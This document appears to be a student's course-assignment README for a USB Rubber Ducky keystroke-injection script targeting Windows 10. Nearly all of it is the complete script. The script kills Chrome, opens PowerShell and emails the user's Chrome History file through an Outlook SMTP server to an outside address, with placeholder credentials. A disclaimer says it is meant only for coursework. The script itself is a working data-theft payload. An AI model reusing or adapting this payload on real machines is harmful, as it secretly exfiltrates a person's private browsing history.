# Chrome History Stealer - Windows 10
## Hassan Chadad
## CS-683 USB Rubber Ducky Assignment

This ducky script will get Chrome's Browser History and send it by email.<br/>
Steps to write the script:
1. Open cmd
2. Close Chrome Browser to be able to access the Chrome History File
3. Open Powershell
4. Send Chrome History File by email
5. Close the powershell

**This script is for the course's assignment and I don't aim to use it to harm or do any real attacks.**

```
REM ---------Open start Menu---------
CONTROL ESCAPE
DELAY 500
REM ---------Type cmd---------
STRING cmd 
DELAY 300
REM ---------Open cmd---------
ENTER
DELAY 500
REM ---------Close the chrome process and all its children---------
STRING taskkill /F /IM chrome.exe /T
ENTER
DELAY 500
REM ---------close cmd---------
STRING exit
ENTER
DELAY 300
REM ---------Open start Menu---------
CONTROL ESCAPE
DELAY 300
REM ---------Open Powershell---------
STRING powershell
ENTER
DELAY 1000
REM ---------Send Chrome's History File by Email---------
STRING $SMTPServer = 'smtp.outlook.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('fromEmail@hotmail.com', 'password');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'fromEmail@hotmail.com'
ENTER
STRING $ReportEmail.To.Add('toemail@gmail.com')
ENTER
STRING $ReportEmail.Subject = 'Chrome Browser history Ducky'
ENTER
STRING $ReportEmail.Body = 'Attached is your list of visited sites.' 
ENTER
STRING $ReportEmail.Attachments.Add('./AppData/Local/Google/Chrome/User Data/Default/History')
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 10000
REM ---------Close Powershell---------
STRING exit
ENTER
```
